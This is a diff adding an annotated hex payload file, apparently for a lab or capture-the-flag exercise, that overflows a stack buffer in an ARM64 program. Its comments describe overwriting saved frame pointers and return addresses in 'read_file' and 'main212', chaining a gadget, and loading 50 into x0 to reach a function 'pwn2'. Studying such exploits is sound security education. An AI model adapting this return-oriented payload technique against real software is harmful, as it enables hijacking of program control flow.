@@ -1,0 +1,31 @@
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+aa aa aa aa aa aa aa aa // Clobber read_file's saved x29 (sp)
+80 9a 44 00 00 00 00 00 // Overwrite read_file's saved x30 (lr)
+ff ff ff ff ff ff ff ff // 32 bytes to clobber for gadget
+ff ff ff ff ff ff ff ff // 32 bytes to clobber for gadget
+ff ff ff ff ff ff ff ff // 32 bytes to clobber for gadget
+ff ff ff ff ff ff ff ff // 32 bytes to clobber for gadget
+bb bb bb bb bb bb bb bb // Clobber main212's saved x29 (sp)
+d4 06 40 00 00 00 00 00 // Overwrite main212's lr for pwn2
+ff ff ff ff ff ff ff ff // Clobbering for argument to x0 since argument is expected in sp + 96
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+32 ff ff ff ff ff ff ff // Putting 50 for the argument in x0
